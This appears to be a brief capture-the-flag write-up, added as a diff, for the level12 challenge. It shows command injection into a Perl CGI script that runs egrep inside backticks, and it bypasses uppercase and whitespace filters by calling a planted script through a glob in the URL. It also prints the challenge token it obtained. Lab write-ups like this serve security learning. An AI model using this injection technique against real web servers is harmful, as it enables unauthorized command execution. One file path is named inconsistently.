@@ -1,0 +1,13 @@
+We can see a file ./level12.pl with this line: @output = `egrep "^$xx" /tmp/xd 2>&1`;
+So we can make a injection code using $xx
+Only problem there are this lines: $xx =~ tr/a-z/A-Z/;
+  $xx =~ s/\s.*//;
+  So we can not do a proper command
+But we can make a file execute a command like /tmp/FLAG
+So we make a file /tmp/FILE with 
+#!/bin/sh
+getflag > /tmp/flag
+after we make the right to this file using chmod 777 /tmp/FLAG
+After we can do http://<ip>:4646/level12.pl?x="`/*/FLAG`";#
+The line @output = `egrep "^$xx" /tmp/xd 2>&1`; will be remplace by @output = `egrep "^"`/*/FLAG`";#" /tmp/xd 2>&1`;
+So now ze have the flag: Check flag.Here is your token : g1qKMiRpXf53AWhDaU7FEkczr
